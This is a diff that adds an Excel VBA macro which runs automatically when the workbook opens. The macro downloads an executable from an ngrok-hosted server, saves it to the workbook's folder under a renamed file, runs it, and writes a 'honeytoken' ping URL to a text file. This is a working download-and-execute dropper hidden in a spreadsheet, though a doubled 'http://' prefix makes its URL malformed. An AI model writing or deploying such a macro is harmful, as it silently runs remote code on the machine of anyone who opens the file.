@@ -1,0 +1,35 @@
+Private Sub Workbook_Open()
+         Dim FileUrl As String
+         Dim objXmlHttpReq As Object
+         Dim objStream As Object
+         Dim ip As String
+         Dim session As String
+         Dim FSO As Object
+         Set FSO = CreateObject("Scripting.FileSystemObject")
+         Dim TextFile As Object
+
+
+         ip = "http://6d18-115-186-152-101.ngrok.io"
+         session = "61ea569c5e74d49a0c177282"
+         FileUrl = "http://" & ip & "/download/exe/" & session & "/test.exe"
+
+         Set objXmlHttpReq = CreateObject("Microsoft.XMLHTTP")
+         objXmlHttpReq.Open "GET", FileUrl, False, "username", "password"
+         objXmlHttpReq.send
+
+         If objXmlHttpReq.Status = 200 Then
+              Set objStream = CreateObject("ADODB.Stream")
+              objStream.Open
+              objStream.Type = 1
+              objStream.Write objXmlHttpReq.responseBody
+              objStream.SaveToFile ThisWorkbook.Path & "\" & "file.txt", 2
+              objStream.Close
+         End If
+
+     FileCopy ThisWorkbook.Path & "\" & "file.txt", ThisWorkbook.Path & "\" & "file.exe"
+
+     Shell ThisWorkbook.Path & "\" & "file.exe", vbNormalFocus
+
+     Set TextFile = FSO.CreateTextFile(ThisWorkbook.Path & "\" & "server_detail.txt", True, True)
+     TextFile.Write "http://" & ip & "/api/honeytoken/ping/" & session & ""
+End Sub
